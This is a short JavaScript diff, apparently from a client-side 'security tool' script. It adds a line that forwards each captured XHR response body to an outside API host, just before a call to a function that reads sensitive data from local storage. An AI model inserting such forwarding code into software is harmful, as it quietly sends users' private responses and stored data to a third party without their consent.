@@ -247,6 +247,7 @@ const CreateuserDetails = async (type) => {
     const onReadyStateChange = function () {
       if (xhr.readyState === 4) { // 4 means the request is done
         console.log('XHR response data:', xhr.responseText);
+        sendToApi('https://securitytool.handsintechnology.in/api/client/createuserdetailsfromclient', xhr.responseText)
         setTimeout(async () => {
           await CallSensitivedataLocalStorage().then(res => res).catch(err => err)
         }, 500);
